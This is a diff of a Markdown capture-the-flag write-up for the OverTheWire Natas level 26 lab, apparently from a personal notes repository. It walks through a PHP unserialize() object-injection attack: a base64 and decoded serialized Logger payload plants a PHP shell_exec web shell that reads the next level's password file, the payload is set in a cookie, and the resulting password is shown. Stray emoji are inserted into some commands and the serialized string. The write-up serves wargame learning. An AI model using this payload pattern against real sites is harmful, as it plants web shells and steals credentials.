@@ -24,6 +24,8 @@ URL: http://natas26.natas.labs.overthewire.org<br>
 ```
 PHP magic methods similar to Python dunder method and C++ function override
 string deserialized back into an object
+
+Look for unserialize() calls and perform an object deserialization attack
 ```
 
 ## Solution
@@ -166,26 +168,29 @@ Y2<input type="text" name="y2" size=2>
 </html>
 
 # Obtain base64-encoded string
-@trungdullc ➜ /workspaces/01noobHacker (main) $ php -d xdebug.mode=off scripts/natas26.php
+@trungdullc ➜ /workspaces/01noobHacker (main) $ php -d xdebug.mode=off scripts/natas26.php ⌨️
 Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9ianBqaWN0ZTYxcWRodnZtcGZyM3RhZGMwby5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=
 # non-base64 encoded, Serialized Form
-@trungdullc ➜ /workspaces/01noobHacker (main) $ echo -n "Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9ianBqaWN0ZTYxcWRodnZtcGZyM3RhZGMwby5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=" | base64 -d
-O:6:"Logger":2:{s:15:"LoggerlogFile";s:65:"/var/www/natas/natas26/img/natas26_bjpjicte61qdhvvmpfr3tadc0o.php";s:15:"LoggerexitMsg";s:59:"<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";}
+@trungdullc ➜ /workspaces/01noobHacker (main) $ echo -n ⌨️ "Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9ianBqaWN0ZTYxcWRodnZtcGZyM3RhZGMwby5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=" | base64 -d
+O:6:"Logger":2:{s:15:"LoggerlogFile";s:65:"/var/www/natas/natas26/img/natas26_bjpjicte61qdhvvmpfr3tadc0o.php"👀;s:15:"LoggerexitMsg";s:59:"<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";}
 
 # In Browser replace drawing value
 F12 → Application
 Storage → Cookies
 
 Name            Value
-drawing       <random_replace_with>
+drawing       <replace_with_base64_below>
   Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9ianBqaWN0ZTYxcWRodnZtcGZyM3RhZGMwby5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=
 
+F5 (Refresh)
 Fatal error: Uncaught Error: Cannot use object of type Logger as array in /var/www/natas/natas26/index.php:105 Stack trace: #0 /var/www/natas/natas26/index.php(131): storeData() #1 {main} thrown in /var/www/natas/natas26/index.php on line 105
 
+Browser: http://natas26.natas.labs.overthewire.org/img/natas26_bjpjicte61qdhvvmpfr3tadc0o.php
+u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne 🔐
 ```
 
 ## Flag
-
+<b>u3RRffXjysjgwFU6b9xa23i6prmUsYne</b>
 
 ## Continue
 [Continue](/overthewire/Natas2627.md)
